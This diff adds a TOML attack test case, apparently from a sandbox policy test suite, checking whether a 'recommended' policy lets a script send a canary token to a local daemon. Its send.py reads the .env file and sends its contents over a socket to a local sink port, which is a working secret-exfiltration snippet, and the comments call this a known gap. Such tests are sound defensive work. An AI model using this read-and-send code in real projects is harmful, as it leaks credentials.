@@ -1,0 +1,28 @@
+# The same exfiltration under `recommended`, which allows untraced local peers
+# so tests can reach a local database after reading its password. The daemon
+# receives the canary: a known gap (see `known-gaps.toml`), closed by
+# `untraced_local(Deny)` as `untraced-local-daemon-exfil` shows.
+name = "untraced-local-daemon-allowed"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "send.py"
+contents = """
+import socket
+secret = open(".env", "rb").read()
+s = socket.socket()
+s.connect(("127.0.0.1", {LOCAL_SINK_PORT}))
+s.sendall(secret)
+"""
+
+[[steps]]
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
